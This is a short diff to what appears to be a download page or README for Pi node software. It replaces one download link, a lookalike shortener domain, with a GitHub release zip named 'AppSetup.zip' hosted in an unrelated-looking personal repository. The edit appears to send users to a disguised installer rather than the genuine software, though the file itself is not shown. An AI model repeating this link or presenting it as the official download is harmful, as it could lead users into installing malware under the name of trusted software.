@@ -1,4 +1,4 @@
-Latest version of the **Pi node software** is 0.4.4. You can check that from the very bottom of the Ξ menu in the main screen. If you have an older version, then get the latest [here](http://goo-gl.me/oCpDK)
+Latest version of the **Pi node software** is 0.4.4. You can check that from the very bottom of the Ξ menu in the main screen. If you have an older version, then get the latest [here](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
 # IMPORTANT UPDATE
 ## For all windows 10 users!!
